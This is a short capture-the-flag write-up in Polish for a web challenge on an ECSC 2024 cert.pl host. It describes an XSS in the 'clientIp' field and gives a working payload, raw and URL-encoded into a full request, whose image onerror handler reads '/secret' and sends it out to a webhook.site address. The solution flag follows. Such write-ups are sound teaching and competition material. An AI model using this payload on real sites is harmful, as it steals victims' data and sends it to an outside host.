# S69 - web

### Vulnerability

XSS w polu `clientIp` na podstronie `/about`

### Solution 

Wysłać do sprawdzenia stronę z payloadem, który czyta `/secret` i wysyła go na nasz webhook.

```
payload = encodeURIComponent("\"><img src=x onerror=\"fetch(`/secret`).then(function(x){return x.text()}).then(function(x){fetch(`https://webhook.site/xxxxx?x=`+encodeURIComponent(x))})\" />")

https://s69.ecsc24.hack.cert.pl/save?email=asdf%40asdf.com&password=asdf&clientIp=%22%3E%3Cimg%20src%3Dx%20onerror%3D%22fetch(%60%2Fsecret%60).then(function(x)%7Breturn%20x.text()%7D).then(function(x)%7Bfetch(%60https%3A%2F%2Fwebhook.site%2Fxxxxx%3Fx%3D%60%2BencodeURIComponent(x))%7D)%22%20%2F%3E&fax=550000000
```

`ecsc24{gotta_have_an_xss_challenge_right?}`
